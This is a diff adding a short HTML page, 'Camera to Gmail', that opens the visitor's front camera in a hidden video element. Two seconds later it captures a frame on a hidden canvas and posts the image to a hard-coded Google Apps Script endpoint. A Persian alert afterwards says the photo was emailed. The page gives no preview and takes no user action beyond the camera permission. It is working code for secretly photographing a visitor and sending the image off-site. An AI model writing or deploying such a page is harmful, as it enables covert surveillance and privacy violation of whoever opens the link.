@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Camera to Gmail</title>
+</head>
+<body>
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => setTimeout(() => capturePhoto(video), 2000);
+      } catch (err) {
+        alert("❌ دسترسی به دوربین داده نشد!");
+      }
+    }
+
+    function capturePhoto(video) {
+      const canvas = document.getElementById("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const context = canvas.getContext("2d");
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const dataUrl = canvas.toDataURL("image/jpeg");
+
+      fetch("https://script.google.com/macros/s/AKfycbyEumpY9MFTvZNpafu0miEJ_6P9VnhvpGnmVzZ6kplyCYMgvM-m51RiRs169jtegKLp/exec", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ image: dataUrl })
+      });
+
+      alert("✅ عکس گرفته شد و به ایمیل ارسال گردید.");
+    }
+
+    window.onload = init;
+  </script>
+</body>
+</html>
